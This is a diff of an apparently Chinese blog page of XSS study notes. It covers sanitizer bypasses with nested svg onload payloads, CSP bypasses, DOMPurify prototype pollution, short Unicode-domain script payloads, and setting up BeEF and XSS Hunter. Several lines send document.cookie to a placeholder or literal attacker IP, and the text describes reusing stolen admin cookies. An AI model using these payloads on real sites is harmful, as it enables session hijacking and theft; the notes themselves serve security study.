@@ -5386,17 +5386,17 @@ include demo.jpg
 &lt;p&gt;那么很明显， &lt;code&gt;alert(1)&lt;/code&gt;  是在页面上 script 标签中的代码全部执行完毕以后才被调用的。这里涉及到浏览器渲染的另外一部分内容： &lt;strong&gt;在 DOM 树构建完成以后，就会触发&lt;/strong&gt; &lt;code&gt;DOMContentLoaded&lt;/code&gt;  事件，接着加载脚本、图片等外部文件，全部加载完成之后触发 &lt;code&gt;load&lt;/code&gt; &lt;strong&gt; 事件&lt;/strong&gt;。&lt;/p&gt;
 &lt;p&gt;页面的 JS 执行是会阻塞 DOM 树构建的。&lt;strong&gt;所以总的来说，在 script 标签内的 JS 执行完毕以后，DOM 树才会构建完成，接着才会加载图片，然后发现加载内容出错才会触发&lt;/strong&gt; &lt;code&gt;error&lt;/code&gt; &lt;strong&gt; 事件&lt;/strong&gt;。&lt;/p&gt;
 &lt;p&gt;由于 js 阻塞 dom 树，一直到 js 语句执行结束后，才可以引入 img，此时 img 的属性已经被 sanitizer 清除了，自然也不可能执行事件代码了。&lt;/p&gt;
-&lt;p&gt;1.2&lt;svg&gt;&lt;svg onload=alert(1)&gt; 可以弹窗原因&lt;/p&gt;
+&lt;p&gt;1.2 &lt;code&gt;&amp;lt;svg&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt; &lt;/code&gt; 可以弹窗原因&lt;/p&gt;
 &lt;p&gt;两个 svg 时，直接弹出了窗口，点击确定以后，调试器才会走到下一行代码，没有执行移除属性的代码。而且，这个地方如果只有一个 &lt;code&gt;&amp;lt;svg onload=alert(1)&amp;gt;&lt;/code&gt; ，那么结果将同 img 一样，直到 script 标签结束以后才能执行相关的代码，这样的代码放到挑战里也将失败&lt;/p&gt;
 &lt;p&gt;当我们没有正确闭合标签的时候，如 &lt;code&gt;&amp;lt;svg&amp;gt;&amp;lt;svg&amp;gt;&lt;/code&gt; ，就可能调用到 &lt;code&gt;PopAll&lt;/code&gt;  来清理；而正确闭合的标签就可能调用到其他出栈函数并调用到 &lt;code&gt;PopCommon&lt;/code&gt; 。这两个函数有一个共同点，都会调用栈中元素的 &lt;code&gt;FinishParsingChildren&lt;/code&gt;  函数。这个函数用于处理子节点解析完毕以后的工作。&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;FinishParsingChildren&lt;/code&gt;  有一个非常明显的判断 &lt;code&gt;IsOutermostSVGSVGElement&lt;/code&gt; ，如果是最外层的 svg 则直接返回。&lt;/p&gt;
 &lt;p&gt;最外层 svg 的 &lt;code&gt;load&lt;/code&gt;  事件由 &lt;code&gt;LocalDOMWindow::dispatchWindowLoadEvent&lt;/code&gt;  触发；而其他 svg 的 &lt;code&gt;load&lt;/code&gt;  事件则在达到结束标记的时候触发。&lt;/p&gt;
 &lt;p&gt;先决条件 在于 svg 不能最外层， onload 必须保证不是最外层属性，不是最外层 onload 会在 innerHTML 之前执行&lt;/p&gt;
-&lt;p&gt;当没有过滤代码时：&amp;lt;svg onload=console.log (“svg0”)&amp;gt;&amp;lt;svg onload=console.log (“svg1”)&amp;gt;&amp;lt;svg onload=console.log (“svg2”)&amp;gt;&lt;/p&gt;
+&lt;p&gt;当没有过滤代码时： &lt;code&gt;&amp;lt;svg onload=console.log(&amp;quot;svg0&amp;quot;)&amp;gt;&amp;lt;svg onload=console.log(&amp;quot;svg1&amp;quot;)&amp;gt;&amp;lt;svg onload=console.log(&amp;quot;svg2&amp;quot;)&amp;gt;&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;触发顺序为&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;svg2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;svg1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DOMContentLoaded&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;svg0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;load&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;套嵌的 svg 之所以成功，是因为当页面为 &lt;code&gt;root.innerHtml&lt;/code&gt;  赋值的时候浏览器进入 DOM 树构建过程；在这个过程中&lt;strong&gt;会触发非最外层 svg 标签的 &lt;code&gt;load&lt;/code&gt;  事件，最终成功执行代码&lt;/strong&gt;。所以，sanitizer 执行的时间点在这之后，无法影响我们的 payload。&lt;/p&gt;
-&lt;p&gt;1.3&lt;svg onload=alert(1)&gt; 失败原因&lt;/p&gt;
+&lt;p&gt;1.3 &lt;code&gt;&amp;lt;svg onload=alert(1)&amp;gt;&lt;/code&gt;  失败原因&lt;/p&gt;
 &lt;p&gt;这里有一个非常明显的判断 &lt;code&gt;IsOutermostSVGSVGElement&lt;/code&gt; ，如果是最外层的 svg 则直接返回。&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;&amp;lt;svg onload=console.log(&amp;quot;svg0&amp;quot;)&amp;gt;&amp;lt;svg onload=console.log(&amp;quot;svg1&amp;quot;)&amp;gt;&amp;lt;svg onload=console.log(&amp;quot;svg2&amp;quot;)&amp;gt;&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;最内层的 svg 先触发，然后再到下一层，而且是在 DOM 树构建完成以前就触发了相关事件；最外层的 svg 则得等到 DOM 树构建完成才能触发。&lt;/p&gt;
@@ -5544,7 +5544,7 @@ include demo.jpg
 &lt;p&gt;在我们已经可以执行任意 js 脚本但由于 CSP 的阻拦我们的 cookie 无法带外传输，就可以用此方法，注意编码 %2B&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;location.href = &amp;quot;vps_ip:xxxx?&amp;quot;+document.cookie&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://101.35.139.208:9999/csp.php?a=&amp;lt;script&amp;gt;location.href=&amp;quot;http://127.0.0.1:18888/csp.php?xss=&amp;quot;%2bdocument.cookie;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;利用前提：存在 XSS，可以执行任意 js 脚本，但由于 CSP 无法数据外带。&lt;/p&gt;
-&lt;p&gt;​					CSP 规则 &lt;code&gt;header(&amp;quot;Content-Security-Policy: default-src &#39;self&#39;;script-src:&#39;unsafe-inline&#39;;&amp;quot;);&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;CSP 规则 &lt;code&gt;header(&amp;quot;Content-Security-Policy: default-src &#39;self&#39;;script-src:&#39;unsafe-inline&#39;;&amp;quot;);&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;2.link 绕过 (失效)&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- firefox --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;link rel=&amp;quot;dns-prefetch&amp;quot; href=&amp;quot;//$&amp;#123;cookie&amp;#125;.vps_ip&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- chrome --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;link rel=&amp;quot;prefetch&amp;quot; href=&amp;quot;//vps_ip?$&amp;#123;cookie&amp;#125;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;外带：&lt;/p&gt;
@@ -5572,7 +5572,7 @@ include demo.jpg
 &lt;/ul&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;meta http-equiv=&amp;quot;Content-Security-Policy&amp;quot; content=&amp;quot;default-src &amp;#x27;self&amp;#x27;; script-src &amp;#x27;unsafe-eval&amp;#x27; https://www.google-analytics.com&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script src=&amp;quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&amp;quot;&amp;gt;&amp;lt;/script&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;7. 不完整 script 绕过&lt;/p&gt;
-&lt;p&gt;只适用于火狐，且只能&lt;?php echo $_GET[&#39;xss&#39;]?&gt; &lt;script nonce=&#39;xxx××&#39;&gt;相邻可以用，通过不完整的 script 标签将后面的 nonce 变为自己的属性&lt;/p&gt;
+&lt;p&gt;只适用于火狐，且只能 &lt;code&gt;&amp;lt;?php echo $_GET[&#39;xss&#39;]?&amp;gt; &amp;lt;script nonce=&#39;xxx××&#39;&amp;gt;&lt;/code&gt;  相邻可以用，通过不完整的 script 标签将后面的 nonce 变为自己的属性&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;http://127.0.0.1/2.php?xss=&amp;lt;script src=data:text/plain,alert(1)&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;&amp;lt;script&lt;/code&gt;  就会被变成一个属性，值为空，之后的 &lt;code&gt;nonce=&#39;xxxxx&#39;&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;会被当成我们输入的 script 标签中的一个属性&lt;/p&gt;
@@ -5669,7 +5669,7 @@ include demo.jpg
 &lt;p&gt;与之前的 sanitizer 类似，DOMPurify 的基本用法非常简单：&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-8.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
 &lt;p&gt;DOMPurify 还接受带有配置的第二个参数。这里还出现了一种使其容易受到原型污染的模式：&lt;/p&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;      /* Set configuration parameters */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ALLOWED_TAGS = &amp;#x27;ALLOWED_TAGS&amp;#x27; in cfg ? addToSet(&amp;#123;&amp;#125;, cfg.ALLOWED_TAGS) : DEFAULT_ALLOWED_TAGS;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ALLOWED_ATTR = &amp;#x27;ALLOWED_ATTR&amp;#x27; in cfg ? addToSet(&amp;#123;&amp;#125;, cfg.ALLOWED_ATTR) : DEFAULT_ALLOWED_ATTR;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/* Set configuration parameters */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ALLOWED_TAGS = &amp;#x27;ALLOWED_TAGS&amp;#x27; in cfg ? addToSet(&amp;#123;&amp;#125;, cfg.ALLOWED_TAGS) : DEFAULT_ALLOWED_TAGS;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ALLOWED_ATTR = &amp;#x27;ALLOWED_ATTR&amp;#x27; in cfg ? addToSet(&amp;#123;&amp;#125;, cfg.ALLOWED_ATTR) : DEFAULT_ALLOWED_ATTR;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;在 JavaScript 中 &lt;code&gt;in&lt;/code&gt; ，运算符遍历原型链。因此 &lt;code&gt;&#39;ALLOWED_ATTR&#39; in cfg&lt;/code&gt; ，如果此属性存在于 &lt;code&gt;Object.prototype&lt;/code&gt; .&lt;/p&gt;
 &lt;p&gt;DOMPurify 默认允许使用 &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt;  标签，因此该漏洞利用只需要 &lt;code&gt;ALLOWED_ATTR&lt;/code&gt;  使用 &lt;code&gt;onerror&lt;/code&gt;  和进行污染 &lt;code&gt;src&lt;/code&gt; 。&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-9.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
@@ -5702,389 +5702,177 @@ include demo.jpg
 &lt;h2 id=&#34;奇技淫巧&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#奇技淫巧&#34;&gt;#&lt;/a&gt; 奇技淫巧&lt;/h2&gt;
 &lt;h3 id=&#34;1通过特殊字符绕过或缩短playload和src长度&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1通过特殊字符绕过或缩短playload和src长度&#34;&gt;#&lt;/a&gt; 1. 通过特殊字符绕过或缩短 playload 和 src 长度&lt;/h3&gt;
 &lt;p&gt;利用浏览器对 Unicode 兼容性构造 script 中短 src&lt;/p&gt;
-&lt;script src=//℡℠.㎺&gt;
-
-浏览器可以解析为telsm.pw，但length只有4个字符
-
-https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names
-
-https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html
-
-ſ
-
-ß
-
-TEL
-
-SR
-
-PW
-
-![img](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1644458305697-1322263c-c705-44d7-a748-39c6b62ac182.png)
-
-利用浏览器对UNiocode支持
-
-![img](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1644458342308-390ae321-9b7c-49c0-9fbf-9952ee801d68.png)
-
-### 1.1 案例：emersion of XSS with 20 characters limitation
-
-### 1.Xss platform
-
-### 1.1beef-xss
-
-安装：`apt-get install beef-xss`
-
-注意事项：
-
-几种常见的安装报错：
-
-1.更新apt源
-
-![image-20220910205931724](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910205931724.png)
-
-
-
-解决方法：`apt-get update ` `sudo apt-get upgrade`
-
-2.缺省依赖
-
-![image-20220910210020518](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910210020518.png)
-
-解决方法:`apt-get install libglib2.0-dev `
-
-安装完之后在进行`apt-get install beef-xss`
-
-
-
-beef默认路径：`http://127.0.0.1:3000/ui/panel`
-
-![image-20220910210358884](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910210358884.png)
-
-
-
-使用pkav测试：
-
-使用系统提供的payload
-
-![image-20220910233217661](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910233217661.png)
-
-![image-20220910211111241](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211111241.png)
-
-此时再去beef panel查看
-
-![image-20220910211138801](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211138801.png)
-
-说明此时已经上线，可以在command中找到命令执行：
-
-说明：
-
-- 绿色模块：表示模块适用当前用户，并且执行结果对用户不可见
-- 红色模块：表示模块不适用当前用户，有些红色模块也可以执行
-- 橙色模块：模块可用，但结果对用户可见
-- 灰色模块：模块为在目标浏览器上测试过
-
-最重要的是可以看到cookies，如果对方是管理员登录，那么我们便可以使用管理员cookie进行登录
-
-![image-20220910211534847](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211534847.png)
-
-### 2.XSS-hunter
-
-https://xsshunter.com/
-
-1.进行注册
-
-![image-20220910232621209](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910232621209.png)
-
-2.注册完后系统会自动登录，在XSS fires页面，如果有已经上线的主机会在此显示，payloads页面提供了一些xsspayload
-
-![image-20220910232730320](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910232730320.png)
-
-3.如果成功上线，会显示如下界面，full report 里面会有后台地址和cookies
-
-![image-20220910233046239](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910233046239.png)
-
-
-
-### 2.1 在centos上安装beef-xss
-
-参考链接：[CentOS安装beEF做XSS平台 - 海鸥博客 - 博客园 (cnblogs.com)](https://www.cnblogs.com/comdodo/p/5506996.html)
-
-但有些需要注意的点
-
-1.上文中的启动rvm不一定是在etc下，是在你自己的安装目录下，启动完后使用rvm 输出版本测试是否成功
-
-我是用如下方法安装成功，因为我是在用户家目录安装的，注意修改rvm版本，是你安装得版本
-
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script src=//℡℠.㎺&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS10ZWxzbS1kcTFoMDNiMzR3MHJmNjMzY2hobmR0NGZla2EucHc=&#34;&gt;浏览器可以解析为 telsm.pw&lt;/span&gt;，但 length 只有 4 个字符&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ZpbGVkZXNjcmlwdG9yL1VuaWNvZGUtTWFwcGluZy1vbi1Eb21haW4tbmFtZXM=&#34;&gt;https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qbGFqYXJhLmdpdGxhYi5pby93ZWIvMjAxOS8xMS8zMC9YU1NfMjBfY2hhcmFjdGVycy5odG1s&#34;&gt;https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ſ&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ß&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;TEL&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;SR&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;PW&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1644458305697-1322263c-c705-44d7-a748-39c6b62ac182.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;利用浏览器对 UNiocode 支持&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1644458342308-390ae321-9b7c-49c0-9fbf-9952ee801d68.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;11-案例emersion-of-xss-with-20-characters-limitation&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#11-案例emersion-of-xss-with-20-characters-limitation&#34;&gt;#&lt;/a&gt; 1.1 案例：emersion of XSS with 20 characters limitation&lt;/h3&gt;
+&lt;h3 id=&#34;1xss-platform&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1xss-platform&#34;&gt;#&lt;/a&gt; 1.Xss platform&lt;/h3&gt;
+&lt;h3 id=&#34;11beef-xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#11beef-xss&#34;&gt;#&lt;/a&gt; 1.1beef-xss&lt;/h3&gt;
+&lt;p&gt;安装： &lt;code&gt;apt-get install beef-xss&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;注意事项：&lt;/p&gt;
+&lt;p&gt;几种常见的安装报错：&lt;/p&gt;
+&lt;p&gt;1. 更新 apt 源&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910205931724.png&#34; alt=&#34;image-20220910205931724&#34;&gt;&lt;/p&gt;
+&lt;p&gt;解决方法： &lt;code&gt;apt-get update &lt;/code&gt;   &lt;code&gt;sudo apt-get upgrade&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;2. 缺省依赖&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910210020518.png&#34; alt=&#34;image-20220910210020518&#34;&gt;&lt;/p&gt;
+&lt;p&gt;解决方法: &lt;code&gt;apt-get install libglib2.0-dev &lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;安装完之后在进行 &lt;code&gt;apt-get install beef-xss&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;beef 默认路径： &lt;code&gt;http://127.0.0.1:3000/ui/panel&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910210358884.png&#34; alt=&#34;image-20220910210358884&#34;&gt;&lt;/p&gt;
+&lt;p&gt;使用 pkav 测试：&lt;/p&gt;
+&lt;p&gt;使用系统提供的 payload&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910233217661.png&#34; alt=&#34;image-20220910233217661&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211111241.png&#34; alt=&#34;image-20220910211111241&#34;&gt;&lt;/p&gt;
+&lt;p&gt;此时再去 beef panel 查看&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211138801.png&#34; alt=&#34;image-20220910211138801&#34;&gt;&lt;/p&gt;
+&lt;p&gt;说明此时已经上线，可以在 command 中找到命令执行：&lt;/p&gt;
+&lt;p&gt;说明：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;绿色模块：表示模块适用当前用户，并且执行结果对用户不可见&lt;/li&gt;
+&lt;li&gt;红色模块：表示模块不适用当前用户，有些红色模块也可以执行&lt;/li&gt;
+&lt;li&gt;橙色模块：模块可用，但结果对用户可见&lt;/li&gt;
+&lt;li&gt;灰色模块：模块为在目标浏览器上测试过&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;最重要的是可以看到 cookies，如果对方是管理员登录，那么我们便可以使用管理员 cookie 进行登录&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211534847.png&#34; alt=&#34;image-20220910211534847&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;2xss-hunter&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2xss-hunter&#34;&gt;#&lt;/a&gt; 2.XSS-hunter&lt;/h3&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94c3NodW50ZXIuY29tLw==&#34;&gt;https://xsshunter.com/&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;1. 进行注册&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910232621209.png&#34; alt=&#34;image-20220910232621209&#34;&gt;&lt;/p&gt;
+&lt;p&gt;2. 注册完后系统会自动登录，在 XSS fires 页面，如果有已经上线的主机会在此显示，payloads 页面提供了一些 xsspayload&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910232730320.png&#34; alt=&#34;image-20220910232730320&#34;&gt;&lt;/p&gt;
+&lt;p&gt;3. 如果成功上线，会显示如下界面，full report 里面会有后台地址和 cookies&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910233046239.png&#34; alt=&#34;image-20220910233046239&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;21-在centos上安装beef-xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#21-在centos上安装beef-xss&#34;&gt;#&lt;/a&gt; 2.1 在 centos 上安装 beef-xss&lt;/h3&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY29tZG9kby9wLzU1MDY5OTYuaHRtbA==&#34;&gt;CentOS 安装 beEF 做 XSS 平台 - 海鸥博客 - 博客园 (cnblogs.com)&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;但有些需要注意的点&lt;/p&gt;
+&lt;p&gt;1. 上文中的启动 rvm 不一定是在 etc 下，是在你自己的安装目录下，启动完后使用 rvm 输出版本测试是否成功&lt;/p&gt;
+&lt;p&gt;我是用如下方法安装成功，因为我是在用户家目录安装的，注意修改 rvm 版本，是你安装得版本&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd ~/.rvm/archives&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar xvzf rvm-1.26.0.tgz # or whatever RVM version you have&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-这将解压缩文件夹，其中将有一个名为 scripts 的文件夹。 现在运行以下命令。
-
+&lt;p&gt;这将解压缩文件夹，其中将有一个名为 scripts 的文件夹。 现在运行以下命令。&lt;/p&gt;
